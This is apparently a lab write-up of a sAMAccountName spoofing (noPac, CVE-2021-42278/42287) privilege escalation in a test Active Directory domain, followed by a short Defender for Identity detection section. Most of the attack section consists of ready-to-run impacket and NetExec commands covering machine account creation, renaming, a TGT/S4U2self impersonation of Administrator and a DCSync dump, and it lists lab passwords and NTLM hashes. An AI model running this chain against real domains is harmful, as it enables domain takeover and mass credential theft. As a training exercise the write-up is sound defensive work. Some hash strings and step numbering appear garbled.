# 🏛️ Case 004: Privilege Escalation (sAMAccountName Spoofing)
📑 Executive Summary
Objective:The primary objective of this case is to escalate privileges from a standard domain user (jon.snow) to a Domain Administrator by exploiting a logical flaw in how Active Directory validates computer account names and Kerberos tickets.

Attack Tools: NetExec (nxc), impackets
⚔️ Red Team: Attack Simulation
1. Exploiting MachineAccountQuota (T1087.002)
The attacker verified that any domain user can add up to 10 machine accounts to the domain.

Command: nxc ldap 192.168.58.11 -u jon.snow -p iknownothing -M maq
<img width="1919" height="146" alt="image" src="https://github.com/user-attachments/assets/3481a70e-4c18-4e01-8c34-2ac747a1db86" />

Result: Confirmed MachineAccountQuota: 10.

2. Creating a Fake Computer Account
Using the jon.snow credentials, the attacker adds a new computer object to the domain to be used as a "controlled" identity.

Command:  addcomputer.py -computer-name 'SYSKEY$' -computer-pass 'Password123!' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'

#### Result: Successfully added machine account SYSKEY$ with password Password123!
<img width="1919" height="152" alt="image" src="https://github.com/user-attachments/assets/deed48d5-0029-4d39-b54a-46b6fc4617c6" />

### 3. Modifying the Attacker Machine Account (T1098)
The attacker utilized the krbrelayx suite to interact with the Domain Controller (WINTERFELL) and clear the SPNs associated with the recently created SYSKEY$ account.

Command: python3 addspn.py --clear -t 'SYSKEY$' -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' 'winterfell.north.sevenkingdoms.local'

Action: Successfully connected to the host and cleared the servicePrincipalName attribute for CN=SYSKEY,CN=Computers,DC=north,DC=sevenkingdoms,DC=local.

Impact: Clearing these attributes ensures that the machine account is in a "clean" state before the attacker attempts to configure it for impersonation against a target service.
<img width="1778" height="207" alt="image" src="https://github.com/user-attachments/assets/4e69b3bf-05de-45a3-a531-81ebe6b020da" />

### 4. 4. Machine Account Renaming (CVE-2021-42278)
After successfully creating the SYSKEY$ machine account, the attacker leveraged the renameMachine.py script to exploit the sAMAccountName Spoofing vulnerability. By removing the trailing $ and renaming the account to match the Domain Controller's hostname (winterfell), the attacker prepares to trick the Key Distribution Center (KDC) during the Kerberos ticket request phase.

Command: python3 renameMachine.py -current-name 'SYSKEY$' -new-name 'winterfell' -dc-ip 'winterfell.north.sevenkingdoms.local' north.sevenkingdoms.local/jon.snow:iknownothing

Action: Successfully modified the sAMAccountName attribute of the object CN=SYSKEY,CN=Computers,DC=north,DC=sevenkingdoms,DC=local from SYSKEY$ to winterfell.

Technical Vulnerability: This exploits a lack of validation where the KDC can be confused between a machine account renamed to a non-standard name and the actual Domain Controller's identity when processing TGT and TGS requests.

📸 Evidence: Machine Renaming (CVE-2021-42278 Execution)
<img width="1919" height="177" alt="image" src="https://github.com/user-attachments/assets/2f6cfac2-06e3-492a-bfe3-b557573f4864" />

### 5. Ticket Request and Account Reversion (CVE-2021-42287)
The attacker requested a Ticket Granting Ticket (TGT) for the spoofed winterfell account. Crucially, before using that ticket to request a Service Ticket, the attacker renamed the machine account back to its original name, SYSKEY$. When the KDC searched for the account associated with the TGT, it failed to find a machine account named winterfell$ and defaulted to the high-privileged Domain Controller object.

Requesting TGT: getTGT.py -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell':'Password123!'

Reverting Name: python3 renameMachine.py -current-name 'winterfell' -new-name 'SYSKEY$' north.sevenkingdoms.local/jon.snow:iknownothing

Action: Successfully reverted the sAMAccountName attribute of the object CN=SYSKEY,CN=Computers,DC=north,DC=sevenkingdoms,DC=local from winterfell back to SYSKEY$.

Result: A valid TGT for the Domain Controller identity was saved to winterfell.ccache.

### 6. Impersonation and S4U2self
Using the acquired TGT, the attacker performed a Service-for-User-to-Self (S4U2self) request to impersonate a Domain Administrator (e.g., administrator) against the CIFS service on the Domain Controller.

Command: export KRB5CCNAME=winterfell.ccache

Result: Successfully acquired a Service Ticket (TGS) for CIFS/winterfell.north.sevenkingdoms.local as the Administrator.

### 7. Service Ticket Acquisition via S4U2self (T1558)
The attacker utilized the previously acquired TGT for the spoofed winterfell account to request a service ticket. Because the account name was briefly manipulated to overlap with the Domain Controller's identity, the KDC allowed the account to perform Service-for-User (S4U) operations, effectively impersonating a high-privileged user.

Command: getST.py -self -impersonate 'administrator' -altservice 'CIFS/winterfell.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell'

Technical Flow:

CCache Retrieval: The tool identified and used the cached TGT for winterfell.

Impersonation Target: The request explicitly targeted the administrator identity.

S4U2self Request: An S4UByteArray and PA_FOR_USER_ENC structure were generated for administrator@north.sevenkingdoms.local.

Result: A final Service Ticket (TGS) was saved as administrator@CIFS_winterfell.north.sevenkingdoms.local.ccache.

Impact: The attacker now possesses an authenticated Kerberos session that grants full administrative access to the filesystem (CIFS) of the Domain Controller.
<img width="1919" height="1024" alt="image" src="https://github.com/user-attachments/assets/9c67168d-358b-49b7-918a-10dc35f42299" />

### 🛡️ Blue Team: Detection & Analysis
1. XDR Critical Incident: sAMAccountName Spoofing
The Defender XDR portal generated a High-Severity alert that mapped the entire attack chain in a single view.

Alert Name: Suspicious modification of a sAMAccountName attribute (CVE-2021-42278 and CVE-2021-42287 exploitation).

Detection Source: Microsoft Defender for Identity.

Alert Logic: The sensor detected that Jon Snow changed the sAMAccountName of the computer account SYSKEY to the name of the Domain Controller, WINTERFELL.

Visual Evidence: The Alert Graph clearly shows the transition from the user account to the spoofed machine identity.

<img width="1919" height="965" alt="image" src="https://github.com/user-attachments/assets/13373a3a-f1ec-478a-baf2-794b7c4bdbd4" /> 
The Defender portal showing the high-fidelity detection of the spoofing attempt by Jon Snow.

### 8. Domain Credential Dumping via DCSync (T1003.006)
With a valid Kerberos ticket for the Administrator account targeting the CIFS service on the Domain Controller, the attacker moved to extract all domain credentials. By utilizing the DRSUAPI (Directory Replication Service Remote Protocol), the attacker simulated a Domain Controller replication request to dump the sensitive NTDS.dit database.

Command: secretsdump.py -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' @'winterfell.north.sevenkingdoms.local'

Action: Leveraged the exported KRB5CCNAME environment variable containing the Administrator TGS to authenticate without providing a password.

Result: Successfully dumped the SAM database, LSA Secrets, and Domain Credentials for all users.

Critical Findings (NTDS.dit Secrets):

Administrator: 500:aad3b435b1404eeaad3b435b1404ee:dbd13e1c4e338284ac4e9874f7de6ef4

krbtgt: 502:aad3b435b1404eeaad3b435b1404ee:f5b67d3ddc972f36a2384eb24748c292

eddard.stark: 1111:aad3b435b1404eeaad3b435b1404ee:d977b98c6c9282c5c478be1d97b237b8

robb.stark: 1113:aad3b435b1404eeaad3b435b1404ee:831486ac7f26860c9e2f51ac91e1a07a

📸 Evidence: Final DCSync and Domain Hash Extraction
<img width="1779" height="815" alt="image" src="https://github.com/user-attachments/assets/189a0770-f439-462e-a9d9-361870aa4fcb" />
secretsdump.py output confirming the successful extraction of high-privileged NTLM hashes from the Domain Controller.
